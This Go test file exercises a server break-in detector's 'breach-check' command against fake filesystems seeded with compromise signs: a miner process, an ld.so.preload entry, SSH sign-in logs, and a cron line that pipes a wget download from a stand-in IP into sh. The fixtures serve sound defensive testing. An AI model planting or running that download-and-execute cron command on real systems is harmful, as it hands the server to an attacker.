package cli

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
	"testing/fstest"
	"time"

	"github.com/kiyesi/kiyesi/agent/internal/system"
)

// breachSystem is a server with one account, nginx running, and extra
// files given by the test.
func breachSystem(t *testing.T, extra fstest.MapFS) {
	t.Helper()
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	old, oldRoot := newSystem, breachAsRoot
	t.Cleanup(func() { newSystem, breachAsRoot = old, oldRoot })
	breachAsRoot = func() bool { return true }
	newSystem = func(root bool, _ string) *system.System {
		fsys := fstest.MapFS{
			"etc/passwd":       {Data: []byte("root:x:0:0:root:/root:/bin/bash\nada:x:1000:1000::/home/ada:/bin/bash\n")},
			"proc/812/comm":    {Data: []byte("nginx\n")},
			"proc/812/cmdline": {Data: []byte("nginx: master process /usr/sbin/nginx")},
		}
		for k, v := range extra {
			fsys[k] = v
		}
		return &system.System{
			FS: fsys, Exec: noExec{}, State: &system.MemState{M: map[string]string{}},
			Now: time.Now, Root: root, OS: system.OSInfo{Name: "Ubuntu 24.04", Tested: true}, Hostname: "web-1",
		}
	}
}

func TestBreachCheckNoSigns(t *testing.T) {
	breachSystem(t, nil)
	code, out, errOut := runCLI(t, "breach-check")
	if code != ExitOK || !strings.Contains(out, "No signs of a break-in") {
		t.Fatalf("code %d, out %q, err %q", code, out, errOut)
	}
	if !strings.Contains(out, "nothing leaves this server") || !strings.Contains(out, "web-1") {
		t.Errorf("out = %q, want the read-only header and the server's name", out)
	}
}

func TestBreachCheckSignsSayWhatToDo(t *testing.T) {
	breachSystem(t, fstest.MapFS{
		"proc/4242/comm":    {Data: []byte("kdevtmpfsi\n")},
		"proc/4242/cmdline": {Data: []byte("/tmp/kdevtmpfsi")},
		"etc/cron.d/x":      {Data: []byte("* * * * * root wget -q -O- http://203.0.113.9/x | sh\n")},
	})
	code, out, _ := runCLI(t, "breach-check")
	if code != ExitFindings {
		t.Fatalf("code = %d, want %d for a sign of a break-in", code, ExitFindings)
	}
	for _, want := range []string{
		"2 signs of a break-in",
		"A crypto miner is running: kdevtmpfsi (pid 4242)",
		"/etc/cron.d/x downloads code and runs it",
		"What to do now",
		"Do not wipe the server yet",
		"https://docs.kiyesi.dev/guides/break-in/",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("out lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "203.0.113.9") {
		t.Errorf("the cron line itself reached the output:\n%s", out)
	}
}

func TestBreachCheckJSON(t *testing.T) {
	breachSystem(t, fstest.MapFS{"etc/ld.so.preload": {Data: []byte("/lib/x.so\n")}})
	code, out, _ := runCLI(t, "breach-check", "--json")
	var cs []struct {
		ID       string `json:"id"`
		Status   string `json:"status"`
		Findings []struct {
			Severity string `json:"severity"`
			Sentence string `json:"sentence"`
		} `json:"findings"`
	}
	if err := json.Unmarshal([]byte(out), &cs); err != nil {
		t.Fatalf("%v: %q", err, out)
	}
	if code != ExitFindings || len(cs) != 1 || cs[0].ID != "break-in" || cs[0].Status != "fail" || cs[0].Findings[0].Severity != "critical" {
		t.Fatalf("code %d, %+v", code, cs)
	}
}

func TestBreachCheckNeedsRoot(t *testing.T) {
	breachSystem(t, nil)
	breachAsRoot = func() bool { return false }
	code, _, errOut := runCLI(t, "breach-check")
	if code != ExitNoAccess || !strings.Contains(errOut, "sudo kiyesi breach-check") {
		t.Fatalf("code %d, err %q", code, errOut)
	}
}

// Login keys changed an hour ago: the note points to kiyesi keys, and lists
// the sign-ins around the change from the sign-in log, with the key each
// used named from the keys on this server. A progress line comes first.
func TestBreachCheckShowsSigninsAroundAKeyChange(t *testing.T) {
	ed, _ := os.ReadFile("../keys/testdata/ed25519.pub")
	fp, _ := os.ReadFile("../keys/testdata/ed25519.fp")
	now := time.Now().UTC()
	changed := now.Add(-time.Hour)
	stamp := func(d time.Duration) string { return now.Add(d).Format("2006-01-02T15:04:05.000000+00:00") }
	log := stamp(-70*time.Minute) + " web-1 sshd[812]: Accepted publickey for root from 203.0.113.9 port 50122 ssh2: ED25519 " + strings.TrimSpace(string(fp)) + "\n" +
		stamp(-50*time.Minute) + " web-1 sshd[901]: Accepted password for deploy from 198.51.100.4 port 40000 ssh2\n" +
		stamp(-72*time.Hour) + " web-1 sshd[100]: Accepted publickey for root from 192.0.2.1 port 1 ssh2\n" +
		stamp(-30*time.Minute) + " web-1 sshd[902]: Failed password for root from 192.0.2.9 port 2 ssh2\n"
	breachSystem(t, fstest.MapFS{
		"root/.ssh/authorized_keys": {Data: ed, Mode: 0o600, ModTime: changed},
		"var/log/auth.log":          {Data: []byte(log), ModTime: now},
	})
	code, out, _ := runCLI(t, "breach-check")
	if code != ExitOK {
		t.Fatalf("code %d\n%s", code, out)
	}
	for _, want := range []string{
		"Comparing every system program with the package it came from",
		"1 change to confirm: was it your team?",
		"sudo kiyesi keys lists each key's fingerprint",
		"ssh-keygen -lf ~/.ssh/id_ed25519.pub",
		"SSH sign-ins within a day of the change (" + changed.Format("2 Jan 15:04 UTC") + "):",
		"root from 203.0.113.9, key " + strings.TrimSpace(string(fp))[:15] + "… (ada@laptop)",
		"deploy from 198.51.100.4, with password",
		"signs checked in",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	for _, not := range []string{"192.0.2.1", "192.0.2.9", "change to check was"} {
		if strings.Contains(out, not) {
			t.Errorf("%q should not be there:\n%s", not, out)
		}
	}
	// --json prints only the result: no progress line in it.
	_, out, _ = runCLI(t, "breach-check", "--json")
	if strings.Contains(out, "Comparing") || !strings.HasPrefix(strings.TrimSpace(out), "[") {
		t.Errorf("json: %q", out)
	}
}

func TestBreachCheckHelpNamesTheNotes(t *testing.T) {
	_, out, _ := runCLI(t, "breach-check", "--help")
	for _, want := range []string{"a\nlogin account added since the last scan", "login keys changed in the last 7", "can take a minute on a small server"} {
		if !strings.Contains(out, want) {
			t.Errorf("help lacks %q:\n%s", want, out)
		}
	}
}
